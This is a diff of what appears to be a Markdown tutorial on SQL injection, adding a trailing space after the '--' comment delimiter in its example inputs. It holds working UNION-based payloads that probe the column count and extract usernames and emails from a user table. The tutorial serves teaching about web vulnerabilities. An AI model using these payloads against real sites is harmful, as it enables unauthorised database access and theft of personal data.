@@ -177,7 +177,7 @@ Task: Get rid of interfering characters by commenting them out
 
 ## Second try
 
-Input: <span style="color:crimson">#dog' UNION SELECT *  FROM user; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT *  FROM user; -- </span>
 
 ( **Important:** Space after delimiter )
 
@@ -222,7 +222,7 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT 1; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1; -- </span>
 
 ```php
 $sql = "SELECT *
@@ -238,7 +238,7 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT 1, 2; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1, 2; -- </span>
 
 ```php
 $sql = "SELECT * 
@@ -254,7 +254,7 @@ $sql = "SELECT *
 
 ## What now? Brutforce!
 
-Input: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; -- </span>
 
 ```php
 $sql = "SELECT *
@@ -276,7 +276,7 @@ $sql = "SELECT *
 <br />
 <br />
 
-Input: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; --</span>
+Input: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; -- </span>
 
 ```php
 $sql = "SELECT *
